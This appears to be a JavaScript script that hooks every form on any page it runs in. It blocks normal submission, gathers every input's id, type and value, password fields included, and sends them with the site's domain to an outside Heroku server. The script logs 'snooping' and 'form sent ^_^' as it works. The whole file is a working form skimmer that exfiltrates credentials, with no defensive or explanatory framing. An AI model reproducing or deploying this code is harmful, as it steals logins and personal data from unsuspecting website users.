var domainRegex = /https?:\/\/([a-zA-Z0-9\.]+)(:[0-9]+)?(\/.*)/g

function getDomain() {
  var url = document.URL
  var res = domainRegex.exec(url)
  console.log(url)
  console.log(res)
  if (!res || res.length < 2) throw new Error("No domain found")
  return res[1]
}

/*
 * Attaching listener to the form
 */

function getInputNodes(node) {
  let childNodes = node.elements
  if (childNodes === undefined || childNodes === null) {
    return []
  }
  let inputs = [];
  for (let j = 0; j < childNodes.length; j++) {
    let childNode = childNodes[j]
    if (childNode.tagName === "INPUT") {
      inputs.push(childNode)
    } else {
      let descendents = getInputNodes(childNode)
      for (let k = 0; k < descendents.length; k++) {
        inputs.push(descendents[k])
      }
    }
  }
  return inputs
}

var urlBackend = 'https://powerful-wave-30603.herokuapp.com'
var pathForm = '/123/form'

function onSubmitEvtReaction(evt) {
  evt.preventDefault()
  let form = evt.target
  let inputsToSend = []
  let inputs = getInputNodes(form)
  for (let l = 0; l < inputs.length; l++) {
    let input = inputs[l]
    let attributes = input.attributes
    let toAdd = {
      id: attributes.id.value,
      type: attributes.type.value,
      value: input.value,
    }
    console.log(toAdd)
    inputsToSend.push(toAdd)
  }
  var body = JSON.stringify({
    form: inputsToSend,
    domain: getDomain(),
  })
  fetch(urlBackend + pathForm, {
    method: "POST",
    mode: "no-cors",
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json; charset=utf-8",
    },
    body: body,
  }).then(() => console.log("form sent ^_^"))
}

/*
 * Application to the page
 */

let forms = document.getElementsByTagName("form")

if (!!forms && forms.length > 0) {
  for (let i = 0; i < forms.length; i++) {
    let form = forms[i]
    console.log("snooping 👀")
    form.addEventListener("submit", onSubmitEvtReaction)
  }
}
